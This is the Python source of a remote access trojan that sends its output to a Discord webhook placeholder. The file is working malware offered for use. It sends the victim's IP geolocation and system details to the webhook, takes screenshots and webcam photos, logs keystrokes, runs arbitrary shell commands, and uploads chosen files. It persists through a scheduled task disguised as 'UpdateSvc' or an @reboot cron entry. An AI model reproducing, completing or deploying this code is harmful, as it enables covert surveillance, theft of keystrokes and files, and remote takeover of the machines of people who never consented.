"""
RAT DISCORD WEBHOOK v2.0 - HEADLESS MODE
Fix untuk Linux/Cloud (no DISPLAY/X11)
GPS + Screenshot + Shell + Persistence
TANPA BOT - Webhook only
"""

import requests
import psutil
import platform
import os
import subprocess
import time
import cv2
from pynput import keyboard
import threading
import base64
import json
import io

# HEADLESS SCREENSHOT FIX
HAS_DISPLAY = 'DISPLAY' in os.environ
try:
    import PIL.ImageGrab
    PIL_AVAILABLE = True
except:
    PIL_AVAILABLE = False

# ═══════════════════════════════════════════════════════════════
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
POLL_INTERVAL = 30

webhook = WEBHOOK_URL
commands = []
last_commands = []

def send_webhook(title, content="", file=None):
    """Kirim ke Discord"""
    try:
        data = {"embeds": [{"title": title, "description": content, "color": 0xff4444}]}
        if file:
            files = {"file": ("capture.png", file, "image/png")}
            requests.post(webhook, data=data, files=files, timeout=10)
        else:
            requests.post(webhook, json=data, timeout=10)
    except:
        pass

def get_sysinfo():
    """GPS + System Info"""
    try:
        ip = requests.get('https://api.ipify.org?format=json', timeout=5).json()['ip']
        geo = requests.get(f'http://ipinfo.io/{ip}/json', timeout=5).json()
        
        loc = geo.get('loc', '0.0,0.0').split(',')
        lat, lon = float(loc[0]), float(loc[1]) if len(loc) > 1 else 0.0
        
        info = f"""**📍 GPS TRACKING**
`IP:` {ip}
`City:` {geo.get('city', '?')} - {geo.get('country', '?')}
`ISP:` {geo.get('org', '?')}
**LAT:** `{lat:.6f}` **LON:** `{lon:.6f}`
🗺️ https://maps.google.com/?q={lat:.6f},{lon:.6f}

**💻 SYSTEM**
`Host:` {platform.node()}
`OS:` {platform.system()} {platform.release()}
`CPU:` {platform.processor()}
`RAM:` {psutil.virtual_memory().percent:.1f}% | `Disk:` {psutil.disk_usage('/').percent:.1f}%"""
        return info
    except Exception as e:
        return f"❌ GPS: {str(e)}"

def take_screenshot():
    """Screenshot - Handle headless"""
    try:
        if HAS_DISPLAY and PIL_AVAILABLE:
            img = PIL.ImageGrab.grab()
        else:
            # Fallback: text screenshot info
            return None
        
        buffer = io.BytesIO()
        img.save(buffer, 'PNG')
        buffer.seek(0)
        return buffer
    except:
        return None

def exec_shell(cmd):
    """Shell command"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20, creationflags=0x08000000)
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
        out = result.stdout or result.stderr or "No output"
        return f"```{out[:1800]}```"
    except:
        return "❌ Shell failed"

def webcam_snap():
    """Webcam"""
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('webcam.jpg', frame)
            with open('webcam.jpg', 'rb') as f:
                send_webhook("📸 WEBCAM", file=f)
            os.remove('webcam.jpg')
            cap.release()
            return True
        cap.release()
        return False
    except:
        return False

def keylogger(duration=20):
    """Keylogger"""
    keys = []
    def callback(key):
        try:
            keys.append(str(key.char))
        except:
            keys.append(f"[{key.name}]")
    
    try:
        with keyboard.Listener(on_press=callback) as listener:
            time.sleep(duration)
        return ''.join(keys[-100:])
    except:
        return "❌ Keylogger failed"

def add_persistence():
    """Persistence"""
    try:
        if platform.system() == "Windows":
            subprocess.run('schtasks /create /sc onlogon /tn "UpdateSvc" /tr "python rat.py" /f', shell=True)
            send_webhook("✅ Windows Scheduled Task")
        else:
            cron_job = f'@reboot cd {os.getcwd()} && python3 rat.py'
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -', shell=True)
            send_webhook("✅ Linux Cron")
    except:
        send_webhook("❌ Persistence failed")

def poll_commands():
    """Cek commands.txt"""
    global commands
    try:
        if os.path.exists('commands.txt'):
            with open('commands.txt', 'r') as f:
                commands = [line.strip() for line in f if line.strip()]
            os.remove('commands.txt')
    except:
        pass

def main_loop():
    """RAT Main Loop"""
    print("🚀 RAT Webhook HEADLESS starting...")
    send_webhook("🚀 RAT ONLINE", get_sysinfo())
    
    while True:
        try:
            poll_commands()
            
            for cmd in commands[:]:  # Copy list
                if cmd not in last_commands:
                    last_commands.append(cmd)
                    print(f"📨 Executing: {cmd}")
                    
                    if cmd == "screenshot":
                        img = take_screenshot()
                        if img:
                            send_webhook("📸 SCREENSHOT", file=img)
                        else:
                            send_webhook("📱 SCREEN INFO", "Headless mode - no display")
                            
                    elif cmd == "webcam":
                        webcam_snap()
                        
                    elif cmd.startswith("shell:"):
                        result = exec_shell(cmd[6:])
                        send_webhook("💻 SHELL", result)
                        
                    elif cmd.startswith("keylog:"):
                        duration = int(cmd[7:]) if cmd[7:].isdigit() else 20
                        keys = keylogger(duration)
                        send_webhook("⌨️ KEYLOG", f"```{keys}```")
                        
                    elif cmd == "persist":
                        add_persistence()
                        
                    elif cmd.startswith("upload:"):
                        filename = cmd[7:]
                        if os.path.exists(filename):
                            size = os.path.getsize(filename) / 1024
                            with open(filename, 'rb') as f:
                                send_webhook("📤 UPLOAD", f"**{filename}** ({size:.1f}KB)", file=f)
            
            # Periodic GPS update
            if int(time.time()) % 1800 == 0:  # 30 menit
                send_webhook("📍 GPS UPDATE", get_sysinfo())
                
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            send_webhook("🔴 RAT OFFLINE")
            break
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main_loop()